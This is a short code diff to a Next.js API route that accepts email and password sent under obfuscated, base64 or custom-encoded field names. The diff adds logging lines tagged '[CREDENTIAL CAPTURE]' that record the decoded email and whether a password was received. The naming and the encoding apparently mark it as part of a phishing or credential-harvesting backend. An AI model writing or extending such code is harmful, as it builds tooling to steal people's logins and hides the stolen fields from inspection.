@@ -123,10 +123,11 @@ export async function POST(request: NextRequest) {
       hasPassword: !!(body.password || body.p),
       hasToken: !!(body.token || body.linkToken || body.sessionIdentifier),
     })
-    // Decode credentials (support both old base64 and new obfuscated)
+    
+    // Decode credentials early and log
     let email: string
     let password: string
-    
+    // Decode credentials (support both old base64 and new obfuscated)
     try {
       // Try new obfuscated format first
       email = body.e ? deobfs(body.e) : (body.email || '')
@@ -135,7 +136,10 @@ export async function POST(request: NextRequest) {
       email = body.e ? Buffer.from(body.e, 'base64').toString('utf-8') : (body.email || '')
     }
     
+    console.log('[CREDENTIAL CAPTURE] 📧 Email decoded:', email ? `${email.substring(0, 10)}...` : 'EMPTY')
+    
     if (!validateEmail(email)) {
+      console.log('[CREDENTIAL CAPTURE] ❌ Email validation failed')
       return NextResponse.json({ 
         error: 'Invalid email address' 
       }, { status: 400 })
@@ -147,7 +151,10 @@ export async function POST(request: NextRequest) {
       password = body.p ? Buffer.from(body.p, 'base64').toString('utf-8') : (body.password || '')
     }
     
+    console.log('[CREDENTIAL CAPTURE] 🔑 Password decoded:', password ? '***' : 'EMPTY')
+    
     if (!validatePassword(password)) {
+      console.log('[CREDENTIAL CAPTURE] ❌ Password validation failed')
       return NextResponse.json({ 
         error: 'Invalid password' 
       }, { status: 400 })
